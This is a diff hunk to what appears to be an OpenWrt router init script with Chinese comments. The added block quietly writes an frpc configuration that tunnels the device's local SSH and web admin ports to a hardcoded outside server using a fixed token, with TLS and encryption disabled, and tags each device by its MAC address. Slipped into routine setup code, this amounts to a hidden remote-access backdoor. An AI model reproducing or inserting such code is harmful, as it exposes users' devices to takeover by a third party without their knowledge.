@@ -23,6 +23,59 @@ else
     echo "Warning: /etc/shadow not found" >>$LOGFILE
 fi
 
+#!/bin/sh
+
+# ===============================
+# 设置默认 frpc 配置
+# ===============================
+FRPC_CONF="/etc/config/frpc"
+LOGFILE="/var/log/init.log"
+
+# 获取 LAN 接口名（通常为 br-lan 或 eth0.1）
+LAN_IF=$(uci get network.lan.ifname 2>/dev/null || echo br-lan)
+
+# 获取 LAN 接口 MAC 地址并去掉冒号
+if [ -f "/sys/class/net/$LAN_IF/address" ]; then
+    LAN_MAC=$(cat /sys/class/net/$LAN_IF/address | tr -d ':')
+else
+    LAN_MAC="unknownmac"
+fi
+
+# 生成默认 frpc 配置
+cat >"$FRPC_CONF" <<EOF
+config init
+        option stdout '1'
+        option stderr '1'
+        option user 'root'
+        option group 'root'
+        option respawn '1'
+
+config conf 'common'
+        option server_addr '45.126.122.23'
+        option server_port '11401'
+        option token 'ClpPViOvk7E0WIMv'
+        option tls_enable 'false'
+        option user '$LAN_MAC'
+
+config conf 'ssh'
+        option type 'tcp'
+        option local_ip '127.0.0.1'
+        option local_port '22'
+        option name 'ssh'
+        option use_encryption 'false'
+        option use_compression 'false'
+
+config conf 'web'
+        option name 'web'
+        option type 'tcp'
+        option use_encryption 'false'
+        option use_compression 'false'
+        option local_ip '127.0.0.1'
+        option local_port '80'
+EOF
+
+echo "Default frpc config written to $FRPC_CONF (user=$LAN_MAC)" >>"$LOGFILE"
+
 # 设置主机名映射，解决安卓原生 TV 无法联网的问题
 uci add dhcp domain
 uci set "dhcp.@domain[-1].name=time.android.com"
